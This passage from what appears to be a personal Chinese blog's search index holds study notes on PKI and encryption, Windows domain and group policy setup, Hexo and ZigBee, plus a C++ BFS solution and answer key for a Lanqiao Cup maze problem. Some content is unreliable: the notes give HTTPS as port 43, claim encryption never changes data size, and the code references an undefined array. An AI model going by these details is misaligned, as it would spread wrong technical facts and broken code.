网络 与 互联网广域网 进行连接的中间。 国内用的一般都是 TI 公司的协议栈，以及硬件芯片cc2530。免费，稳定，可靠。","link":"","tags":[{"name":"zigbee","slug":"zigbee","permalink":"http://www.fangning.xyz.com/tags/zigbee/"}]},{"title":"Hello world","date":"2020-09-03T09:42:39.545Z","path":"2020/09/03/hexo 默认文章/","text":"清除1$ hexo clean 生成1$ hexo generate *运行到 localhost 测试1$ hexo server 提交1$ hexo deploy","link":"","tags":[{"name":"个人博客搭建","slug":"个人博客搭建","permalink":"http://www.fangning.xyz.com/tags/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]},{"title":"PKI","date":"2020-08-24T14:33:30.000Z","path":"2020/08/24/2020.08.24 PKI/","text":"PKI什么是 PKI 1234567891011121314151. Public Key Infrastructure：公钥基础设施 1) 作用：通过加密技术 和 数字签名 保证信息的安全。例如：互联网中数据传输过程中进行加密、 2) 组成：&#x27;公钥加密技术、数字证书、CA&#x27;、RA......2. 信息安全三要素: 1) &#x27;机密性&#x27;：别人拿到数据，但是看不懂，破不开。 2) &#x27;完整性&#x27;：要防止接受到的数据不能被是被中间人破坏，篡改的。如果被破坏了，接收方不能获取，需要重新发送。 3) &#x27;身份验证/操作的不可否认性&#x27;：检查接收方获得的数据是否是由发送方发出的。防止数据被伪造发送，就像伪 DHCP 服务器发送 Offer 包，导致客户机获取网络配置失败。 # 这些三种技术，都包含在 PKI 技术范畴。无论那种加密技术，都有包含 PKI 技术。 3. 应用领域: 1) SSL/HTTPS ：网页信息技术。（https = http ssl） 2) IPsecVPN：很多网络公司用到的 vpn。 3) 以及部分远程访问 VPN。 公钥加密技术1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253541. 作用：实现对信息加密、数字签名等安全保障。3. 加密算法：将原文数据 --------&gt; 通过加密算法 ----------&gt; 生成密文 1) 密钥：加密/破解加密 所用到的关键字、字符串。 2) x + 5 = y：其中x 为原文，y 为密文， &#x27;5 则是密钥&#x27;。 4. 加密算法分类: ------------# 保障了数据传输的 机密性 1) 对称加密算法： DES\\3DES\\AES高级加密算法 &#x27;加解密的密钥一致！&#x27;，只需要一个密钥。 密钥容易丢失，所以会导致算法不安全。 密钥通常会有成百上千字节的字符串。 密钥不是通过数据传输发送，而是&#x27;提前数据收发双方协商得到的&#x27;。 2) 非对称加密算法： RSA\\DH *通信需要双方各自产生一对公私钥. *双方各自交换公钥，以 明文 形式传输。 *公钥私钥互为加解密关系。用公钥加密的数据，必须用私钥才能解密 &lt;=&gt; 用私钥加密的数据，也只能用公钥才能解密。 # 公钥+非对称加密算法+原文 = 密文 # 密文+私钥+加密算法 = 原文 &#x27;因此，如果想要 破解非对称加密过的数据 只能使用接收方私自拥有的 私钥&#x27;。 3) Hash算法： MD5\\SHA-数字 * hash 算法不可逆。 * -数字：中数字表示生成的 hash值 的长度。 * &#x27;主要作用&#x27;：验证数据完整性。 * 用 hash 算法加密的数据，称作 &#x27;摘要&#x27;。5. 数字签名：自己的私钥加密的数据，确定了该数据出处唯一性，见该数据如见人 * 使用私钥加密，只有用自己的公钥才能解开。 * 如果用公钥解开了该数据，表示这个数据一定是我发送出来的。 * 因为私钥，只有发送方有，不泄露，保密。6. 使用加密算法对数据进行加密后，&#x27;数据大小并不会发生改变&#x27;。7. 证书: 1) 作用: * 非对称加密计算传输数据过程中，需要收发双方得到对方的 公钥。 * 如何确保，你所得到的公钥，就一定是对方所发送的呢？也就是&#x27;如何确认 公钥的不可否认性?&#x27; * 这时，需要一个双方都信任的官方机构，颁发 &#x27;证书&#x27; 来证明。 2) 证书颁发与实现: * 数据发送方，到 CA(证书颁发机构) 注册一个 &#x27;数字证书&#x27;。 * CA 官方自己拥有 公钥 和 私钥。 * CA 将 &#x27;数据发送方的标识信息、公钥&#x27; 以及 &#x27;自己的标识信息、数字签名&#x27; 集成到一个证书上颁发给数据发送方。 * 数据发送方将证书发送给接收方，接收方使用 CA机构公钥 对证书中的数字签名进行解密、得到发送方的公钥。 * 这样通过双方都信任的第三方 CA 机构的证明，保证了数据的不可否认性。 3) 证书用于保证公密的合法性。 4) 证书格式遵循 X.509 标准。 5) 数字证书包含信息: * 使用者的公钥值 * 使用者标识信息（名称、电子邮箱地址、ip地址......） * 有效期（证书有效时间） * 颁发者标识信息 * 颁发者的数字签名 6) 数字证书由权威公正的第三方机构 CA 签发。 非对称加密技术传输数据过程 机密性：发送方使用 RSA+对方公钥 对数据进行加密，接收方使用自己的私钥才能解密。 不可否认性：发送方需要在数据包后面，添加一个数据摘要的数字签名，只有使用自己的私钥才能生成该数字签名。 完整性：发送方对加密后的数据进行 hash 加密，接受方得到数据后，对验证 hash 值的准确性。 公钥的合法性：发送方发送权威证书给接受方，接收方使用 CA官方 公钥对证书进行解密验证。确保了发送方公钥的合法性。 实验 部署 https / ssl 服务器。 http 使用的是 80 端口。通信过程无加密。 https 使用的是 43 端口。需要设置 CA 官方证书颁发机构。通信过程使用 公钥加密技术。 自己搭建一个 CA 证书颁发机构。(虚拟自用） 相关经验 RSA 目前其中一种比较常见的非对称加密算法————公开的算法 课外拓展 无","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"BFS广度搜索","date":"2020-08-22T09:14:30.000Z","path":"2020/08/22/2020.08.22 BFS广度优先遍历/","text":"BFS 广度优先遍历经验12345678910111213141516171819202122232425262728293031321. 不同于 深度优先遍历dfs ———— 递归式遍历(所问即所答)。 1) 广度优先遍历采用的是 迭代遍历的方式，非递归只有循环. 2. 该算法主要思想是: 1) 从&#x27;最开始&#x27;的&#x27;第一个节点&#x27;，按照一种固定的规律，&#x27;遍历出&#x27;与之&#x27;相邻的节点&#x27;。 2) 采用的存储数据结构是 ———— &#x27;队列&#x27;。有时根据题目需求和效率需求，会采用 c++ stl容器 ———— &#x27;优先队列&#x27;( Priority queue )。 3) &#x27;手动添加第一个&#x27;结点到队列，然后进入循环体，&#x27;直到队列为空&#x27;或&#x27;找到目标&#x27;结束遍历。遍历的同时，&#x27;会向&#x27;队列中&#x27;添加新的节点&#x27;，&#x27;删除已经遍历过的节点&#x27;。3. 结构体队列: 1) 大多数情况下，我们采用的对象并不是简单的级别数据类型。需要我们&#x27;自己设定抽象数据类型&#x27;。 2) 比如跑图的时候，需要记录 &#x27;步数step、坐标xy、路径string&#x27;。这些记录每走一步，都需要记录下来，所以定义一个结构体，然后&#x27;采用结构体队列&#x27;来存储遍历时的&#x27;中间结果&#x27;。 4. 结构体声明: struct node&#123; int x, y; node( int x1, int y1 )&#123; x = x1; y = y1; &#125; &#125; 构造方法的使用: node t( 1, 1); # 声明了一个结构体变量，初始化成员 x = 1, y = 1 5. 队列的操作: queue&lt;node&gt; q; # 定义一个结构体队列 q.push( node t ); # 添加一个节点到队列 q.pop( node t ); # 从队列删除一个节点 q.front(); # 读出队列一个节点 q.empty(); # 判断队列是否为空 true/false q.size(); # 读取队列中元素个数 例题1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859601. 原题路径: &quot; D:\\Workspace-acm\\WinterVacationSelf-Study\\蓝桥杯历届试题\\省赛\\第十届蓝桥杯大赛个人赛省赛（软件类）真题 &quot; 2. 代码路径: &quot; D:\\Workspace-acm\\WinterVacationSelf-Study\\LanQiaoTenB.E &quot; 3. 题目: 【问题描述】 下图给出了一个迷宫的平面图，其中标记为 1 的为障碍，标记为 0 的为可 以通行的地方。010000000100001001110000 迷宫的入口为左上角，出口为右下角，在迷宫中，只能从一个位置走到这 个它的上、下、左、右四个方向之一。 对于上面的迷宫，从入口开始，可以按DRRURRDDDR 的顺序通过迷宫，一共 10 步。其中 D、U、L、R 分别表示向下、向上、向左、向右走。 对于下面这个更复杂的迷宫（30 行 50 列），请找出一种通过迷宫的方式， 其使用的步数最少，在步数最少的前提下，请找出字典序最小的一个作为答案。 请注意在字典序中D&lt;L&lt;R&lt;U。（如果你把以下文字复制到文本文件中，请务必检查复制的内容是否与文档中的一致。在试题目录下有一个文件 maze.txt，内容与下面的文本相同）010101010010110010010101100101101001000010001010100000100010000010101001000010000000100110011010010101111011010010001000001101001011100011000000010000010000000010101000110100001010000010101010110010110001111100000010100001001010001010000010110000000011001000110101000010101100011010011010101011110111000110110101010010010010100000010001010011100000001010000010100010011010101011111001100001000011101000111000001010100001100010000001000101001100001001110001101000011100100010010101010101010100011010000001000010010000010100101010111010001010101000010111100100101001001000010000010101010100100100010100000000100000001010110011110100011000001010101000111010101001110000100001100001011001111011010000100010101010100001101010100101000010100000111011101001100000001011000100001011001011010010111000000001001010100100000001010010000100010000010001111010100100101001010101101001010100011010101101110000110101110010100001000011000000101001010000010001110000100000100011000011010110100000010010100100100001110110100101000101000000001110110010110101101010100001001010000100001101010100001000100010010001000101011010000100011001000100001010100101010101111101001000000100101000000110010100101001000001000000000010110100000010011101110010010000111010010110111010000000011010001000100010000000100001110100000011001110101000101000100010001111100010101001010000001000100000101001010010101100000001001010100010111010000011110000100001000000011011100000000100000000101110000001100111010111010001000110111010101101111000【答案提交】 这是一道结果填空的题，你只需要算出结果后提交即可。本题的结果为一 个字符串，包含四种字母 D、U、L、R，在提交答案时只填写这个字符串，填写多余的内容将无法得分。 答案：DDDDRRURRRRRRDRRRRDDDLDDRDDDDDDDDDDDDRDDRRRURRUURRDDDDRDRRRRRRDRRURRDDDRRRRUURUUUUUUULULLUUUURRRRUULLLUUUULLUUULUURRURRURURRRDDRRRRRDDRRDDLLLDDRRDDRDDLDDDLLDDLLLDLDDDLDDRRRRRRRRRDDDDDDRR 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;string&gt;using namespace std;const int H = 33, L = 53;const int N = H*L;char a[H][L];bool vis[H][L];int dir1[4][2] = &#123; &#123;1 , 0&#125;, &#123;0 , -1&#125;, &#123;0 , 1&#125;, &#123;-1 , 0&#125; &#125;;struct note&#123; int x, y; //坐标 char ans[N]; //字符串答案,表示搜索过的路径 int step; //步数 note(int a, int b, int s)&#123; x = a; y = b; step = s; &#125;&#125;;void bfs(void)&#123; queue&lt;note&gt; q; note t(1 , 1, 0); t.ans[t.step] = &#x27;\\0&#x27;; q.push(t); vis[1][1] = true; a[1][1] = &#x27;*&#x27;; while(!q.empty()) &#123; //取出队列的第一个元素 note tt = q.front(); q.pop(); //判断是否满足搜索条件 if(tt.x == 30 &amp;&amp; tt.y == 50) &#123; tt.ans[tt.step] = &#x27;\\0&#x27;; printf(&quot;\\n%d\\n%s\\n&quot;, tt.step, tt.ans); //putpath(tt.ans); //break; &#125; //不满足条件时，搜索其他位置，并且加入队列 for( int i = 0; i &lt; 4; i++ ) &#123; int x = tt.x + dir1[i][0]; int y = tt.y + dir1[i][1]; if(x &gt;= 1 &amp;&amp; y &gt;= 1 &amp;&amp; x &lt;= 30 &amp;&amp; y &lt;= 50) &#123; if(!vis[x][y] &amp;&amp; a[x][y] == &#x27;0&#x27;) &#123; note t3(x, y, tt.step + 1); for(int j = 0; j &lt; tt.step; j++) t3.ans[j] = tt.ans[j]; t3.ans[t3.step - 1] = dir2[i]; q.push(t3); vis[x][y] = true; &#125; &#125; &#125; &#125;&#125;int main()&#123; for(int i = 1; i &lt;= 30; i++)&#123; for(int j = 1; j &lt;= 50; j++)&#123; scanf(&quot;%c&quot;, &amp;a[i][j]); &#125; getchar(); &#125; bfs(); return 0;&#125;/**1. 步数最少。2. 字典序列最小3. DLRU下左右上4. 输出字符串// 打印路径代码void putpath(char ans[N])&#123; int x = 1, y = 1; a[x][y] = &#x27;*&#x27;; for(int i = 0; ans[i] != &#x27;\\0&#x27;; i++)&#123; switch (ans[i]) &#123; case &#x27;D&#x27;: x += dir1[0][0]; y += dir1[0][1]; break; case &#x27;L&#x27;: x += dir1[1][0]; y += dir1[1][1]; break; case &#x27;R&#x27;: x += dir1[2][0]; y += dir1[2][1]; break; case &#x27;U&#x27;: x += dir1[3][0]; y += dir1[3][1]; break; &#125; if(a[x][y] == &#x27;0&#x27;) a[x][y] = &#x27;*&#x27;; else a[x][y] = &#x27;&amp;&#x27;; &#125; for(int i = 1; i &lt;= 30; i++)&#123; for(int j = 1; j &lt;= 50; j++) putchar(a[i][j]); putchar(&#x27;\\n&#x27;); &#125;&#125;**/","link":"","tags":[{"name":"ACM","slug":"ACM","permalink":"http://www.fangning.xyz.com/tags/ACM/"}]},{"title":"域3","date":"2020-08-20T11:33:30.000Z","path":"2020/08/20/2020.08.20 域3/","text":"域3将域用户获得成员机的完全控制权限123456781. 新建的域用户虽然可以登陆任何的计算机，但是&#x27;没有本地计算机的完全控制权限&#x27;。2. 如果需要让某个域用户获得某台计算机的完全控制权限。 1) 需要将该用户&#x27;加入&#x27;本地计算机的 &#x27;administrators 组&#x27;当中，而不是加入 域管理员组Domain admins。 2) 方法就是，先用 &#x27;域管理员账&#x27;号 登陆 &#x27;该计算&#x27;机，然后将 &#x27;普通域用户&#x27; 添加到 &#x27;本地管理员组&#x27;。 3) 这样，该&#x27;普通域用户&#x27;就&#x27;获得&#x27;了&#x27;该本地计算机&#x27;的&#x27;完全控制权限&#x27;。3. 所有的 Domain admins 用户都属于该域下所有计算机的 Administrators。可想而知，&#x27;域管理员的权限非常之大&#x27;，是&#x27;所有计算机的管理员&#x27;。 前提知识1234567891011121314151617181920212223242526272829301. OU：organization unit 组织单位 1) 作用：用于归类域资源（users , computer , domain controller）。 2) 组的出现是为了方便赋予权限；组织单位的出现则是为了方便&#x27;下发组策略&#x27;。 3) 实验：1. AD 用户和计算机中，整个域 xiaoqiao.com 就是一个最大的 OU 容器。 2. 右键新建 -&gt; 组织单位 -&gt; 起一个部门或者企业的分类。 OU 的作用就是给成员机分类。系统自带DC组单位. 3. 新建完成后，&#x27;文件夹图标带有一个小 logo&#x27; 的才是&#x27;真正&#x27;的 &#x27;organization unit&#x27; ，&#x27;才可以下达组策略&#x27;. 4. 可以将任何 &#x27;域用户/组 和 计算机pc&#x27; 移动到新建的 OU文件夹中。整个公司人员分类称作&#x27;组织架构&#x27;。组策略作用对象可以是用户，或者计算机。 2. GPO = Group Policy：组策略. 1) 作用：通过组策略可以修改计算机的各种属性，如开始菜单、桌面背景、网络参数等. 2) 组策略在域中，是&#x27;基于 OU 来下发&#x27;. 域组策略&#x27;优先级&#x27; &gt; &#x27;本地组策略&#x27; 3) 管理工具里面可以打开组策略工具。对 OU 进行新建组策略，查看和修改组策略。一般情况下，&#x27;组策略命名与OU文件夹名一致&#x27;。 4) 组策下发（此处以修改成员机桌面壁纸为例）: (1) 右击需要下发组策略的 OU。新建组策略，命名为该 OU 的名称。 (2) 右击新建立好的组策略，编辑。 (3) 可以对 OU 中的 PU 进行下发，或者对 OU 中的用户进行下发。 下发之前，一般将新建的 域用户 和 成员机 分别移动到 组织架构 对应的 OU 中。 (4) 从 用户策略，管理模板，桌面，壁纸 中启用该策略。 用户修改壁纸时，需要找到目标壁纸，一般采用 文件共享 192.168.190.132\\\\share\\a.jpg（也可使用ftp://192.168.190.132/share/a.jpg）。因此，需要提前准备好共享文件夹，以及桌面壁纸(.jpg格式) (5) 组策略在域中下发后，用户的应用顺序应该是：&#x27;LSDOU&#x27;。L 表示本地，S 暂时未接触，D 域策略，&#x27;OU组策略&#x27; (6) 对于矛盾的策略，&#x27;最后应用的策略为最终结果&#x27;；对于OU组策略，用户先从 上级OU 策略开始应用，最后到最接近该用户所在位置的 下级OU 策略。因此，如果上下级OU 策略矛盾，&#x27;最后生效的是 下级OU 策略&#x27;。 ****正常情况下：LSDOU顺序 上级OU： 桌面：aa 运行：删除 下级OU： 桌面：未配置 运行：不删除 下级OU用户结果：桌面：aa 运行：不删除 组策略的一些设置1234567891011121314151. 查看修改过的组策略条目: 1) 选中策略。 2) 等级设置复选框。 3) 弹出警告，点击添加、确定。 4) 然后就可以看到修改过的 &#x27;计算机配置&#x27; 以及 &#x27;用户配置&#x27; 的&#x27;详细信息&#x27;。 2. 策略的&#x27;强制&#x27;功能: 1) 有的时候，许多 下级OU 组策略会覆盖 上级OU 的策略。如果在未来一小段时间内，又需要让所有用户启用 上级OU 组策略。那就很麻烦了，需要将下级与之冲突的策略全部停用，这样修改很麻烦，而且改完如果哪一天再改回来，简直要命。所以就出现了一个很方便的功能 ———— &#x27;策略强制&#x27; 2) 右击策略，点击强制。此时，该策略成为域用户&#x27;最后应用的策略&#x27;，后面的下级OU 不再应用。 3. OU的&#x27;组织继承&#x27;功能: 1) 域用户应用组策略时，&#x27;直接跳过上级OU&#x27;设置&#x27;的组策略&#x27;，&#x27;只应用&#x27;该 OU&#x27;自身所设置的组策略&#x27;。 2) 右击OU，点击阻止继承。类似于文件夹访问控制列表阻止继承一样。 3) 如果 上级OU策略 &#x27;开启了强&#x27;制， 下级OU &#x27;开启了阻止继承&#x27;。最终结果，还是遵循 上级OU 的强制，&#x27;阻止继承失效&#x27;。 常用策略12345678910111213141516171819201. 开/关机脚本：计算机配置 -&gt; 策略 -&gt; Windows 设置 -&gt; 脚本 1) 只要计算机一开机/关机，就会运行该脚本。 2) 不需要用户登陆，因为该策略时针对用户机的。2. 登陆/注销脚本：用户配置 -&gt; 策略 -&gt; Windows 设置 -&gt; 脚本 1) 只要用户一登陆/注销，就会运行指定脚本。3. ctrl+alt+del 组合键登陆用户：Windows 设置 -&gt; 安全设置 -&gt; 本地策略 -&gt; 安全选项 -&gt; 交互式登陆 1) 启用&#x27;无需按 Ctrl+Alt+Del 键登陆用户&#x27;策略。4. 密码策略 强制密码满足3/4原则的复杂性：windows 设置 -&gt; 安全设置 -&gt; 密码策略 -&gt; 密码复杂性要求 1) 这里有所有有关密码设置的策略。 2) 强制密码历史: 新改的密码不能是以前用过的密码。 3) 用可还原的方式来存储密码: 就是将原来不可逆的加密方式，变成可逆，一般不适使用。 5. 账户锁定阈值：安全设置 -&gt; 账户安全 -&gt; 账户锁定 1) 账户锁定阈值：输入&#x27;密码错误 n 次&#x27;后&#x27;锁定该账户&#x27;，不能登陆。 2) 账户锁定时间：账户被锁&#x27; n 分钟后解锁&#x27;。也可跳过&#x27;域管理员身份&#x27;，在域控中&#x27;修改域用户属性&#x27;来人为解锁。 3) 重置账户锁定计数器：用户输入密码错误次数在 n 分钟之内计数为有效错误。&#x27;如果两次错误输入相隔超过改时间，那么不累加&#x27;。 域的综合应用1234567891011121314151617181920212223242526271. 文件共享 与 ftp + 域 = 无需创建账户 / 无需登陆密码 连接 1) 配置固定 ip 地址，将域名解析指向 域控。 2) 将 文件共享服务器 取一个比较容易辨别的计算机名. 3) 将服务器加入域。 4) 创建 文件共享 以及 ftp 服务。然后，将 Domain Users 用户组，加入到服务的访问控制列表。 # 此时，客户机，无需知道 服务器的ip地址 ，服务器也 不用提供连接账户 给客户。直接就可以使 域用户 连接服务器。 5) 测试：\\\\share.xiaoqiao.com\\share 回车即可。 ftp://share.xiaoqiao.com/ 回车即可。 # 其中 share.xiaoqiao.com 主机名可替代 ip 地址。 2. 域对其他相关服务的优化: 1) &#x27;web服务&#x27;：将web页面发部为非匿名访问，只对 域用户 开发。可以免登陆。 2) &#x27;DHCP服务&#x27;。3. 原理: 1) LDAP：Light Directory Access Protocol ———— 轻量级目录访问协议 2) 凡是想要和 域控中的活动目录 &#x27;做接轨。就必须要具备 LDAP协议&#x27;。 3) windows系统是自带该协议的。 有些 wifi 路由器嵌入 ldap 协议的话，连接的时候不是输入 wifi 密码，而是输入 域用户账户。4. 组管理: 1) 活动目录里面新建组的时候。 2) 如果要给某 OU 赋权限，必须在 OU 里面建立一个组。 只有组才能赋予权限。 3) 组作用域: * 全局 ———— 该域中的组，&#x27;可以被 该林中的其他域 赋予权限&#x27;。 # 一般选择全局 * 通用 ———— 一旦该林中其他域，给该域中的通用组赋权限，那么&#x27;会在其他域中自动生成该组&#x27;。 * 本地域 ———— &#x27;只在&#x27;本地域起作用。 相关经验 因为策略条目有很多，如果需要下发策略，但是找不到在哪，或者不知道是不是存在。可以百度。 域控机不能重启关机什么的，如果必须重启的话，也只能够在晚上。 最后做综合实验的时候搞 FTP 服务弄了很久，最后发现！！！ 做 FTP 实验一定要将服务器与客户机的防火墙关闭，一定记得关闭防火墙！！！ IIS 提供的 ftp 服务，默认使用 主动模式，也就是说如果客户机开了防火墙的话，服务器无法与之建立数据传输通道，最后只能看到子文件夹，不能访问其中的文件！！！ 权限没问题！","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"域2","date":"2020-08-19T07:33:30.000Z","path":"2020/08/19/2020.08.19 域2/","text":"部署安装活动目录12345678910111213141516171819202122232425262728293031323334353637383940411. 部署安装 win2008 虚拟机。配置静态 IP 地址。2. win2008 装管理工具，不需要从光盘中获取安装包. 1) 右击计算机 -&gt; 角色(服务器) -&gt; 添加角色 -&gt; DC服务 -&gt; 安装。 ##此方法不推荐使用，还有方法二 2) #方法二: 3) 安装&#x27;活动目录&#x27;： 0) 配置之前，不要给该计算机指定 DNS 和 网关，&#x27;只需要给一个固定IP就行了&#x27;。 给该服务器的计算机名改为 DC1。因为，AD配置完之后，会自动该计算机加入域。 1) win + r -&gt; &#x27;dcpromo&#x27; 该命令可进行安装/卸载 2) 高级模式不用勾选。 3) 如果没指定 DNS 的话，它会有一个是否在该计算机上安装 DNS。&#x27;一步一定要勾选&#x27;. 4) #域树: 如果当前有一个域，位于一棵树的根部 root，我们可以称之为&#x27;根域&#x27;。与根域相连的可能是若干个&#x27;子域&#x27;，子域与根域之间通过&#x27;专线&#x27;连接，现实中可能是公司内部建立的&#x27;独立通信线路&#x27;，以便&#x27;跨区域实现局域网&#x27;。而，根域可能是一个公司的总部，&#x27;子域可能&#x27;是一个公司在其他地区的&#x27;分部&#x27;，但是他们&#x27;同属一个域&#x27;。例如 根域域控: qf.com 子域域控: shanghai.qf.com(表示上海分布)。 #域林: 一个公司内部两个不太相关的业务，建立&#x27;两个独立&#x27;的&#x27;根域&#x27; ———— 如 weixin.com 和 qq.com 。两者都属于腾讯公司内部业务，但是互不包含，&#x27;都是根域级别&#x27;。两棵域树，或者&#x27;多棵域树的集合&#x27;，就是&#x27;域林&#x27;。一般，国内很少有公司使用域林管理结构，顶多就是域树级别。 5) 设置根域名：fn222.com，#与此同时也表示 DC 的计算机名为 fn222 6) 设置林功能级别：windows server 2003。也就是规定，整个林中，所有域服务器版本不能低于 win2003。 7) 设置域功能级别：windows server 2008。也就是规定，整个域中，所有子域服务器版本不能低于 win2008。 8) 设置数据库(活动目录AD)、日志、策略存储路径，这里选默认就好。 9) 设置 AD 还原密码，一般用不到。用来还原活动目录。 4) 重启安装完成后，登陆域 fn222/administrator 原来的 &#x27;本地管理员&#x27; 已经&#x27;升级&#x27;为 &#x27;域管理员&#x27;。 5) 查看管理工具，DNS管理工具，发现自动生成了一个域名解析区域，以及主机A记录。如果需要设置转发器，可以进行进一步修改。 6) 查看 &#x27;Active Director 用户和计算机&#x27;。&#x27;验证&#x27;Domain Controllers 和 Users中的分组。用户，管理员等&#x27;用户和组&#x27;都&#x27;升级&#x27;了，变成了&#x27;域用户，域组&#x27;。 Computer：普通域成员机列表 Domain Controller：DC列表 Users：域用户/组 3. #加入域添加成员机: 1) 配置 IP 与域控同属一个局域网；给员工计算机指定 DNS 到 域控地址。 2) 修改计算机属性，计算机名 -&gt; 更改 -&gt; 隶属于域 fn222.com -&gt; 使用域管理员登陆fn222.com/administrator。 3) 查看活动目录用户管理工具，是否新添加了 成员机。 4) 在活动目录用户管理工具 -&gt; user 中为该成员机添加一个 域用户。右击，添加用户，填写相应信息即可。用户登陆名一般为 &#x27;名.姓&#x27; eg: &#x27;ning.fang&#x27; @fn222 。 5) 成员机，使用&#x27;域用户&#x27;登陆计算机检查是否能够登陆成功。 &#x27;注意&#x27;: 一旦计算机处于域环境中: #那么 域管理员组 会自动加入本地计算机的 管理员adminitrators组。 #另外 域用户组 会自动加入本地计算机的 用户users组。 因此在设置一些访问控制列表权限的时候，一定要注意考虑这两个组的位置，以免权限产生相互影响。 相关经验 win2008管理中有一个角色表示的就是该服务器。 IP 地址后面接斜杠表示的是子网掩码。192.168.101.10 /24 。24 表示网段是前24位，255.255.255.0 Neat Download Manager 是真的牛逼。今天在github上下个东西，如果是单线程的话估计就 几k每秒 ，然后用这玩意，直接开32线程。这还不是最牛的，在一部分线程完成后，后面越下越慢，这时，只需要取消任务，然后在控制面版里面恢复该任务，直接可以重新建立线程，总线程可以超过32！！ 新建域之后，如果生产环境中，该服务器中 DNS 服务器一定要设置 转发器。不然，你家公司 dns服务器 每次都迭代查询太慢。","link":"","tags":[{"name":"千锋网络安全","slug":"千锋网络安全","permalink":"http://www.fangning.xyz.com/tags/%E5%8D%83%E9%94%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"域","date":"2020-08-17T07:33:30.000Z","path":"2020/08/17/2020.08.17 域/","text":"域123456789101112131415161718192021222324252627282930313233343536373839404142434445461. Domain 英文名。 1) 很多方面都需要用到域，并且域的重要性很高。或者说是，域管理器的重要性很高。就像，对于DHCP网络连接来讲，dhcp服务器很重要。 2) 越是大型的公司，对于域的依赖性也就越高。有些公司会专门聘请 域管理员，并且资薪也特别高。不过，这种职业需求很少。2. 对于内外环境: 1) 工作组：默认模式，特点是&#x27;人人平等&#x27;，但是不利于管理。 2) 域：&#x27;人人不平等&#x27;，可以&#x27;实现集中管理，统一管理&#x27;。3. 域的组成: 1) 域控制器：老大。是一种服务器，电脑，简称&#x27;域控&#x27; —— DC（Domain Contronller）。 2) 成员机：普通用户，相互平等。4. 域的部署: 1) 首先用一台服务器，安装域管理软件，这时，域就形成了。 但是，在形成之初，域中只有 DC，也就是域控一台计算机。 接下来，就需要一个个进行&#x27;加入域&#x27;操作。该操作只出现在公司成立之初，或者大型改造过程中。 2) 安装域控制器 ———— 就生成了域环境。 3) 安装活动目录 ———— 就生成了域控制器。以此，域的部署，要先从活动目录开始。 4) 活动目录：Active Directory == AD5. 拓扑图中，域用一个三角形显示 1) 每个域都有一个域名 ———— 一般以公司名命名，如 qf.com 2) 域中每台计算机的计算机名，其实也是一个主机名。如: 计算机名为 FANGING 那么，它在&#x27;域中的名字标识就是 FANGNING.qf.com&#x27; 并且 该域名与你这太计算机的 IP 地址进行绑定。 3) 这种功能&#x27;类似于 DNS域名解析服务器&#x27;，但是全过程不需要安装 DNS管理工具，也不需要添加 A记录。&#x27;全程自动完成&#x27;。可以说，&#x27;域控本身也是一台dns服务器&#x27;。 4) 域环境中，&#x27;只需要知道员工的姓名&#x27;，就可以知道他的域名，通过 dc 进行解析，&#x27;就可以知道他的 IP 地址&#x27;，通过交换机还可以知道他的 mac地址。公司内部的计算机，不能随意改动计算机名。 6. 活动目录特点: 1) 域控的&#x27;核心&#x27;，其实就是依赖于&#x27;活动目录&#x27;。所以，活动目录是&#x27;域环境中最重要的部分&#x27; ———— 集中/统一 管理。 2) 活动目录是一张表。存放着整个公司的&#x27;公共资源&#x27;，也成为&#x27;域资源&#x27;. (1) 域账号：区别于计算机的本地账号。可以&#x27;通过该域账号&#x27;，&#x27;登陆&#x27;处于域中的&#x27;成员机&#x27;. 1)首次通过域账号密码登陆成员机时，计算机&#x27;不会直接判断账号密码错误&#x27;。先会通过 DC域名 &#x27;解析出 DC地址&#x27; 2)然后，询问 DC，&#x27;活动目录中&#x27;，是否有该&#x27;域账号&#x27;，&#x27;进行核对&#x27;。如果有，那么成员机就会&#x27;允许&#x27;这个域账号进行登陆。 3)登陆成功后，成员机会在本地&#x27;创建&#x27;对应该账号的&#x27;家目录&#x27;。 (2) 存储企业内部所有&#x27;公共服务器地址&#x27;。一个企业中，有很多的服务器地址，例如域名解析服务器地址、动态主机配置服务器地址、ftp服务器地址、web服务器地址。这些地址很难记住，可以将其存储到活动目录中，创建一个成员机都可以访问的公共资源。这样&#x27;只需要记住活动目录地址&#x27;。7. 组策略 GPO: 1) 与活动目录配合，进行集中管理。组策略很强大，并且设计了很多很多条。 2) Group Policy ———— 组 策略 3) 一个组策略就像是一个&#x27;能实现某种功能的批处理指令&#x27;。它可以对活动目录中的一组域账号统一下达某种指令。 例如统一修改成员机桌面图标。只需要&#x27;在活动目录中&#x27;添加相应的&#x27;一条组策略&#x27;，然后&#x27;应用&#x27;就行了。8. 将计算机通过域账号登陆时: 1) 首先会&#x27;询问 DC&#x27;，是否对我下达了什么指令 2) DC 通过访问活动目录发现，该&#x27;成员机所属的分组内，有一条组策略&#x27;。 3) 该成员机通过读取该组策略，&#x27;就会按照要求执行&#x27;。 4) 这就实现了一种 集中/统一 管理。全靠活动目录！ 相关经验 关于 域 管理设置有一本书籍，专门来讲 域 管理。甚至，有一个专门的职业来进行这种管理。 我们普通电脑，右键属性看到计算机默认是处于工作组状态，公司环境的话，计算机是处于 域 管理状态。 可以，通过右击此电脑，属性中查看计算机所属环境。 一般公司内每个员工都需要配置一个域账号，并且每个员工都必须使用域账号登陆成员机。 按照 公司内部的组织架构 将成员机 